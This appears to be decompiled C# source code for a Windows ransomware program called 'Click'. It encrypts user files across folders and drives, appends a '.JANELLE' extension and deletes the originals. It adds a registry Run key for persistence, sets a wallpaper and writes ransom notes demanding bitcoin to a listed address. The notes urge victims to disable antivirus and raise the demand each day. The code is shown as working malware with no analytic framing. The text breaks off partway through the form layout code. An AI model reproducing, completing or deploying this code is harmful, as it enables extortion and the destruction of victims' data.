using System;
using System.Collections;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Click.Properties;
using Microsoft.Win32;

namespace Click;

public class Form1 : Form
{
	private static Random random = new Random();

	private bool flag = false;

	private const uint SPI_SETDESKWALLPAPER = 20u;

	private const uint SPIF_UPDATEINIFILE = 1u;

	private const uint SPIF_SENDWININICHANGE = 2u;

	private IContainer components = null;

	private WebBrowser content;

	private Label label2;

	private PictureBox pictureBox1;

	private Label _duedate;

	private Label label3;

	private TextBox bitcoin;

	private PictureBox pictureBox2;

	private TextBox unlock_key;

	private Button button1;

	private Label label1;

	private Label label5;

	private TextBox encrypted_key;

	private Timer timer;

	private Label label6;

	private Label label7;

	private Label _datelosttimeleft;

	private Label label8;

	private Label _datelost;

	private Label _ammount;

	private Label _duetimeleft;

	private LinkLabel linkLabel1;

	private LinkLabel linkLabel2;

	private LinkLabel linkLabel3;

	private Panel panel1;

	private Panel panel2;

	private ComboBox languages;

	public string RandomString(int length)
	{
		return new string((from s in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length)
			select s[random.Next(s.Length)]).ToArray());
	}

	public static string EncryptString(string key, string plainText)
	{
		byte[] iV = new byte[16];
		byte[] inArray;
		using (Aes aes = Aes.Create())
		{
			aes.Key = Encoding.UTF8.GetBytes(key);
			aes.IV = iV;
			ICryptoTransform transform = aes.CreateEncryptor(aes.Key, aes.IV);
			using MemoryStream memoryStream = new MemoryStream();
			using CryptoStream stream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
			using (StreamWriter streamWriter = new StreamWriter(stream))
			{
				streamWriter.Write(plainText);
			}
			inArray = memoryStream.ToArray();
		}
		return Convert.ToBase64String(inArray);
	}

	public static string DecryptString(string key, string cipherText)
	{
		byte[] iV = new byte[16];
		byte[] buffer = Convert.FromBase64String(cipherText);
		using Aes aes = Aes.Create();
		aes.Key = Encoding.UTF8.GetBytes(key);
		aes.IV = iV;
		ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);
		using MemoryStream stream = new MemoryStream(buffer);
		using CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read);
		using StreamReader streamReader = new StreamReader(stream2);
		return streamReader.ReadToEnd();
	}

	public Form1()
	{
		InitializeComponent();
	}

	private void startProcess(string secret)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), recursive: true, secret);
		GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Personal), recursive: true, secret);
		GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), recursive: true, secret);
		GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), recursive: true, secret);
		GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos), recursive: true, secret);
		GetDirectories("C:\\Users\\" + Environment.UserName + "\\Downloads", recursive: true, secret);
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (!driveInfo.Name.ToLower().Equals(Environment.GetEnvironmentVariable("WINDIR")!.Replace("WINDOWS", "").ToLower()))
			{
				GetDirectories(driveInfo.Name, recursive: true, secret);
			}
		}
	}

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

	private static void DisplayPicture(string file_name)
	{
		if (!SystemParametersInfo(20u, 0u, file_name, 0u))
		{
			Console.WriteLine("Error");
		}
	}

	public void GetDirectories(string path, bool recursive, string secret)
	{
		try
		{
			string[] files = Directory.GetFiles(path);
			string[] array = files;
			foreach (string filepath in array)
			{
				PathFile(filepath, secret);
			}
			if (!recursive)
			{
				return;
			}
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string child in directories)
				{
					Thread thread = new Thread((ThreadStart)delegate
					{
						GetDirectories(child, recursive, secret);
					});
					thread.IsBackground = true;
					thread.Start();
				}
			}
			catch (Exception)
			{
				Console.WriteLine($"You don't have permission to view {path}");
			}
		}
		catch (Exception)
		{
			Console.WriteLine($"You don't have permission to view subdirectories of {path}");
		}
	}

	private void PathFile(string filepath, string secret)
	{
		Console.WriteLine(filepath);
		if (flag)
		{
			if (!filepath.EndsWith("Click.exe") && !filepath.EndsWith("Readme.txt") && !filepath.EndsWith(".JANELLE") && !filepath.EndsWith(".aes") && !filepath.Contains("index.html"))
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(filepath);
				directoryInfo.Attributes = FileAttributes.Hidden;
				FileEncrypt(filepath, secret);
				File.Delete(filepath);
				File.Move(filepath + ".aes", filepath + ".aes.JANELLE");
			}
			return;
		}
		if (Path.GetExtension(filepath)!.EndsWith(".JANELLE"))
		{
			File.Move(filepath, filepath.Replace(".JANELLE", ""));
			filepath = filepath.Replace(".JANELLE", "");
		}
		if (filepath.EndsWith(".aes"))
		{
			FileDecrypt(filepath, filepath.Replace(".aes", ""), secret);
			File.Delete(filepath);
		}
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			for (int i = 0; i < 10; i++)
			{
				rNGCryptoServiceProvider.GetBytes(array);
			}
		}
		return array;
	}

	private void FileEncrypt(string inputFile, string password)
	{
		byte[] array = GenerateRandomSalt();
		FileStream fileStream = new FileStream(inputFile + ".aes", FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				Application.DoEvents();
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
		finally
		{
			cryptoStream.Close();
			fileStream.Close();
		}
	}

	private void FileDecrypt(string inputFile, string outputFile, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		byte[] array = new byte[32];
		FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CFB;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
			{
				Application.DoEvents();
				fileStream2.Write(array2, 0, count);
			}
		}
		catch (CryptographicException ex)
		{
			Console.WriteLine("CryptographicException error: " + ex.Message);
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Error: " + ex2.Message);
		}
		try
		{
			cryptoStream.Close();
		}
		catch (Exception ex3)
		{
			Console.WriteLine("Error by closing CryptoStream: " + ex3.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
		}
	}

	private void Form1_FormClosed(object sender, FormClosedEventArgs e)
	{
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
		((Control)this).Hide();
		Thread thread = new Thread((ThreadStart)delegate
		{
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Expected O, but got Unknown
			while (true)
			{
				Thread.Sleep(10000);
				((Control)this).BeginInvoke((Delegate)(MethodInvoker)delegate
				{
					((Control)this).Show();
					((Form)this).set_WindowState((FormWindowState)0);
				});
			}
		});
		thread.IsBackground = true;
		thread.Start();
	}

	private void button1_Click_1(object sender, EventArgs e)
	{
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)unlock_key).get_Text().Equals(DecryptString(Settings.Default.PRIVATE_KEY, ((Control)encrypted_key).get_Text())))
		{
			Button val = (Button)((sender is Button) ? sender : null);
			((Control)val).set_Enabled(false);
			flag = false;
			Settings.Default.keysecret = ((Control)unlock_key).get_Text();
			((SettingsBase)Settings.Default).Save();
			startProcess(((Control)unlock_key).get_Text());
		}
		else
		{
			MessageBox.Show("Provide Unlock Key.");
		}
	}

	private void timer_Tick(object sender, EventArgs e)
	{
		TimeSpan timeSpan = DateTime.Parse(Settings.Default.due_date) - DateTime.Now;
		((Control)_duetimeleft).set_Text(timeSpan.Days + " : " + timeSpan.Hours + " : " + timeSpan.Minutes + " : " + timeSpan.Seconds);
		if (timeSpan.Hours <= 0 && timeSpan.Days <= 0)
		{
			Settings.Default.COUNTER++;
			Settings.Default.due_date = DateTime.Now.AddDays(1.0).ToString();
			((SettingsBase)Settings.Default).Save();
			((Control)_ammount).set_Text("Send $" + 600 * Settings.Default.COUNTER + " worth of bitcoin to this address");
		}
		timeSpan = DateTime.Parse(Settings.Default.lost_date) - DateTime.Now;
		((Control)_datelosttimeleft).set_Text(timeSpan.Days + " : " + timeSpan.Hours + " : " + timeSpan.Minutes + " : " + timeSpan.Seconds);
		if (timeSpan.Hours <= 0 && timeSpan.Days <= 0)
		{
			Settings.Default.isDisabled = true;
			((SettingsBase)Settings.Default).Save();
		}
		if (Settings.Default.isDisabled)
		{
			((Control)this).set_Enabled(false);
		}
	}

	private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://www.investopedia.com/terms/b/bitcoin.asp");
	}

	private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://www.investopedia.com/articles/investing/082914/basics-buying-and-investing-bitcoin.asp");
	}

	private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
	}

	private void languages_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	private void ChangeLanguage(Control ctl, string lang)
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		foreach (InputLanguage item in (ReadOnlyCollectionBase)(object)InputLanguage.get_InstalledInputLanguages())
		{
			InputLanguage val = item;
			if (val.get_Culture().DisplayName == ((Control)languages).get_Text())
			{
				InputLanguage.set_CurrentInputLanguage(val);
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		((Control)bitcoin).set_Text("114NHHMdrCuJ6P3mwHHeyWvwdWdDWzqdpo");
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("virus", Application.get_ExecutablePath().ToString());
		foreach (InputLanguage item in (ReadOnlyCollectionBase)(object)InputLanguage.get_InstalledInputLanguages())
		{
			InputLanguage val = item;
			languages.get_Items().Add((object)val.get_Culture().DisplayName);
		}
		((ListControl)languages).set_SelectedIndex(0);
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Readme.txt"))
		{
			File.Create(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Readme.txt").Close();
			File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Readme.txt", "\r\nQ:  What's wrong with my files?\r\n\r\nA:  Ooops, your important files are encrypted. It means you will not be able to access them anymore until they are decrypted.\r\nIf you follow our instructions, we guarantee that you can decrypt all your files quickly and safely!\r\nLet's start decrypting!\r\n\r\nQ:  What do I do?\r\n\r\nA:  First, you need to pay service fees for the decryption.\r\nPlease send $600 worth of bitcoin to this bitcoin address: 114NHHMdrCuJ6P3mwHHeyWvwdWdDWzqdpo\r\nNext, please contact me at jannelle2021@protonmail.com with proof of payment\r\n(You may need to disable your antivirus for a while.)\r\n\r\nQ. Finding it hard to buy bitcoins ?\r\nA:  You can also purchase bitcoins at a bitcoin ATM near you.\r\n\r\nQ: How do I know this is legit?\r\n\r\nA:  You have two options.\r\nYou either loose all your files or you pay the ransom and have your files decrypted.\r\n\r\n*If you need our assistance, send an email at janelle2021@protonmail.com on the decryptor window.  \r\n\r\n                                ");
		}
		if (Settings.Default.isDisabled)
		{
			((Control)this).set_Enabled(false);
		}
		if (Settings.Default.start_date.Length <= 0)
		{
			Settings.Default.start_date = DateTime.Now.ToString();
			Settings.Default.lost_date = DateTime.Now.AddDays(7.0).ToString();
			Settings.Default.due_date = DateTime.Now.AddDays(1.0).ToString();
			((SettingsBase)Settings.Default).Save();
		}
		((Control)_duedate).set_Text(Settings.Default.due_date);
		((Control)_datelost).set_Text(Settings.Default.lost_date);
		if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\index.html"))
		{
			content.set_Url(new Uri($"file:///{Environment.GetFolderPath(Environment.SpecialFolder.Desktop)}/index.html"));
		}
		else
		{
			File.Create(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\index.html").Close();
			File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\index.html", "\r\n<!DOCTYPE html>\r\n<html lang='en'>\r\n\r\n<head>\r\n    <meta charset='UTF-8'>\r\n    <meta http - equiv='X-UA-Compatible' content='IE=edge'>\r\n    <meta name='viewport' content='width=device-width, initial-scale=1.0'>\r\n    <title> Document </title>\r\n</head>\r\n\r\n<body>\r\n\r\n\r\n    <h2>What Happened to My Computer?</h2>\r\n    <p> Your important files are encrypted.\r\n        Many of your documents, photos, videos, databases and other files are no longer accessible because they have\r\n        been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time. Nobody\r\n        can recover your files without our decryption service.\r\n    </p>\r\n    <h2>Can I Recover My Files?</h2>\r\n    Sure. We guarantee that you can recover all your files safely and easily.\r\n        But if you want to decrypt all your files, you need to pay.\r\n        You have 24 hours to submit the payment. After that the price will be doubled.\r\n        Also, if you don't pay in 7 days, you will not be able to recover your files forever.\r\n\r\n        <h2>How Do I Pay?</h2>\r\n        <p>\r\n            Payment is accepted in Bitcoin only. For more information, click <About bitcoin>.\r\n        </p>\r\n        <p>\r\n            Please check the current price of Bitcoin and buy some bitcoins. For more information, click <How to buy\r\n                bitcoins>.\r\n        </p>\r\n        <p>\r\n            And send the correct amount to the address specified in this window.\r\n        </p>\r\n        <p>\r\n            After your payment, click <Check Payment>. Best time to check: 9:00am - 11:00am GMT from Monday to\r\n                Friday.\r\n        </p>\r\n        <p>\r\n            Once the payment is checked, you can start decrypting your files immediately.\r\n        </p>\r\n        <h2>Contact</h2>\r\n        If you need our assistance, send a message by clicking <Contact Us>.\r\n            <p style='color: red;'>\r\n                We strongly recommend you to not remove this software, and disable your anti-virus for a\r\n                while,\r\n                until you pay and the payment gets processed. If your anti-virus gets updated and removes\r\n                this\r\n                software automatically, you will not be able to recover your files even if you pay!\r\n\r\n            </p>\r\n\r\n\r\n\r\n</body>\r\n\r\n\r\n</html>\r\n\r\n                       ");
			content.set_Url(new Uri($"file:///{Environment.GetFolderPath(Environment.SpecialFolder.Desktop)}/index.html"));
		}
		((Image)Resources.background).Save(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\background.png");
		DisplayPicture(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\background.png");
		if (Settings.Default.secret == "A")
		{
			Settings.Default.secret = RandomString(256);
			((SettingsBase)Settings.Default).Save();
		}
		File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\EncryptedKey.txt");
		File.Create(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\EncryptedKey.txt").Close();
		string secret = Settings.Default.secret;
		File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\EncryptedKey.txt", EncryptString(Settings.Default.PRIVATE_KEY, secret));
		if (Settings.Default.keysecret == "A")
		{
			flag = true;
			Thread thread = new Thread((ThreadStart)delegate
			{
				startProcess(secret);
			});
			thread.IsBackground = true;
			thread.Start();
			Console.WriteLine(secret);
		}
		((Control)encrypted_key).set_Text(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\EncryptedKey.txt"));
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Expected O, but got Unknown
		//IL_01f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Expected O, but got Unknown
		//IL_0291: Unknown result type (might be due to invalid IL or missing references)
		//IL_029b: Expected O, but got Unknown
		//IL_0321: Unknown result type (might be due to invalid IL or missing references)
		//IL_032b: Expected O, but got Unknown
		//IL_04dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e7: Expected O, but got Unknown
		//IL_0574: Unknown result type (might be due to invalid IL or missing references)
		//IL_057e: Expected O, but got Unknown
		//IL_06a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_06af: Expected O, but got Unknown
		//IL_0736: Unknown result type (might be due to invalid IL or missing references)
		//IL_0740: Expected O, but got Unknown
		//IL_07d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e1: Expected O, but got Unknown
		//IL_0875: Unknown result type (might be due to invalid IL or missing references)
		//IL_087f: Expected O, but got Unknown
		//IL_0913: Unknown result type (might be due to invalid IL or missing references)
		//IL_091d: Expected O, but got Unknown
		//IL_09a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_09ae: Expected O, but got Unknown
		//IL_0a48: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a52: Expected O, but got Unknown
		//IL_0b56: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b60: Expected O, but got Unknown
		//IL_0bfc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c06: Expected O, but got Unknown
		//IL_0ca2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cac: Expected O, but got Unknown
		//IL_10b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_10bd: Expected O, but got Unknown
		//IL_10db: Unknown result type (might be due to invalid IL or missing references)
		//IL_10e5: Expected O, but got Unknown
		//IL_10ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_10f7: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		content = new WebBrowser();
		label2 = new Label();
		_duedate = new Label();
		label3 = new Label();
		bitcoin = new TextBox();
		unlock_key = new TextBox();
		button1 = new Button();
		label1 = new Label();
		label5 = new Label();
		encrypted_key = new TextBox();
		timer = new Timer(components);
		label6 = new Label();
		label7 = new Label();
		_datelosttimeleft = new Label();
		label8 = new Label();
		_datelost = new Label();
		_ammount = new Label();
		_duetimeleft = new Label();
		linkLabel1 = new LinkLabel();
		linkLabel2 = new LinkLabel();
		linkLabel3 = new LinkLabel();
		panel1 = new Panel();
		panel2 = new Panel();
		languages = new ComboBox();
		pictureBox2 = new PictureBox();
		pictureBox1 = new PictureBox();
		((ISupportInitialize)pictureBox2).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)content).set_Location(new Point(244, 65));
		((Control)content).set_MinimumSize(new Size(20, 20));
		((Control)content).set_Name("content");
		((Control)content).set_Size(new Size(670, 432));
		((Control)content).set_TabIndex(2);
		content.set_Url(new Uri("", UriKind.Relative));
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(SystemColors.ButtonFace);
		((Control)label2).set_Location(new Point(265, 20));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(460, 29));
		((Control)label2).set_TabIndex(3);
		((Control)label2).set_Text("Oops! Your FIles have been encrypted");
		((Control)_duedate).set_Anchor((AnchorStyles)13);
		((Control)_duedate).set_AutoSize(true);
		((Control)_duedate).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)_duedate).set_ForeColor(SystemColors.Control);
		((Control)_duedate).set_Location(new Point(24, 225));
		((Control)_duedate).set_Name("_duedate");
		((Control)_duedate).set_Size(new Size(51, 16));
		((Control)_duedate).set_TabIndex(5);
		((Control)_duedate).set_Text("label1");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.Gold);
		((Control)label3).set_Location(new Point(24, 194));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(192, 13));
		((Control)label3).set_TabIndex(7);
		((Control)label3).set_Text("Your Payment Will Be Raised On");
		((Control)bitcoin).set_Location(new Point(420, 534));
		((Control)bitcoin).set_Name("bitcoin");
		((TextBoxBase)bitcoin).set_ReadOnly(true);
		((Control)bitcoin).set_Size(new Size(483, 20));
		((Control)bitcoin).set_TabIndex(9);
		((Control)unlock_key).set_Location(new Point(388, 634));
		((Control)unlock_key).set_Name("unlock_key");
		((Control)unlock_key).set_Size(new Size(339, 20));
		((Control)unlock_key).set_TabIndex(11);
		((Control)button1).set_Location(new Point(753, 634));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(131, 23));
		((Control)button1).set_TabIndex(12);
		((Control)button1).set_Text("Unlock My Files");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click_1);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(SystemColors.Control);
		((Control)label1).set_Location(new Point(241, 638));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(141, 16));
		((Control)label1).set_TabIndex(13);
		((Control)label1).set_Text("Enter Key Provided");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(SystemColors.Control);
		((Control)label5).set_Location(new Point(241, 590));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(378, 16));
		((Control)label5).set_TabIndex(15);
		((Control)label5).set_Text("Provide this key and payment reciept to given number");
		((Control)encrypted_key).set_Location(new Point(630, 589));
		((Control)encrypted_key).set_Name("encrypted_key");
		((TextBoxBase)encrypted_key).set_ReadOnly(true);
		((Control)encrypted_key).set_Size(new Size(273, 20));
		((Control)encrypted_key).set_TabIndex(14);
		timer.set_Enabled(true);
		timer.set_Interval(1000);
		timer.add_Tick((EventHandler)timer_Tick);
		((Control)label6).set_Anchor((AnchorStyles)13);
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(SystemColors.Control);
		((Control)label6).set_Location(new Point(70, 255));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(60, 13));
		((Control)label6).set_TabIndex(16);
		((Control)label6).set_Text("Time Left");
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_ForeColor(Color.Gold);
		((Control)label7).set_Location(new Point(51, 341));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(142, 13));
		((Control)label7).set_TabIndex(18);
		((Control)label7).set_Text("Your files will be lost on");
		((Control)_datelosttimeleft).set_Anchor((AnchorStyles)13);
		((Control)_datelosttimeleft).set_AutoSize(true);
		((Control)_datelosttimeleft).set_Font(new Font("PMingLiU-ExtB", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)_datelosttimeleft).set_ForeColor(SystemColors.Control);
		((Control)_datelosttimeleft).set_Location(new Point(35, 425));
		((Control)_datelosttimeleft).set_Name("_datelosttimeleft");
		((Control)_datelosttimeleft).set_Size(new Size(59, 19));
		((Control)_datelosttimeleft).set_TabIndex(21);
		((Control)_datelosttimeleft).set_Text("label1");
		((Control)label8).set_Anchor((AnchorStyles)13);
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_ForeColor(SystemColors.Control);
		((Control)label8).set_Location(new Point(70, 400));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(60, 13));
		((Control)label8).set_TabIndex(20);
		((Control)label8).set_Text("Time Left");
		((Control)_datelost).set_Anchor((AnchorStyles)13);
		((Control)_datelost).set_AutoSize(true);
		((Control)_datelost).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)_datelost).set_ForeColor(SystemColors.Control);
		((Control)_datelost).set_Location(new Point(24, 370));
		((Control)_datelost).set_Name("_datelost");
		((Control)_datelost).set_Size(new Size(51, 16));
		((Control)_datelost).set_TabIndex(19);
		((Control)_datelost).set_Text("label1");
		((Control)_ammount).set_AutoSize(true);
		((Control)_ammount).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)_ammount).set_ForeColor(Color.Gold);
		((Control)_ammount).set_Location(new Point(417, 513));
		((Control)_ammount).set_Name("_ammount");
		((Control)_ammount).set_Size(new Size(247, 13));
		((Control)_ammount).set_TabIndex(22);
		((Control)_ammount).set_Text("Send $600 worth of bitcoin to this address");
		((Control)_duetimeleft).set_Anchor((AnchorStyles)13);
		((Control)_duetimeleft).set_AutoSize(true);
		((Control)_duetimeleft).set_Font(new Font("PMingLiU-ExtB", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)_duetimeleft).set_ForeColor(SystemColors.Control);
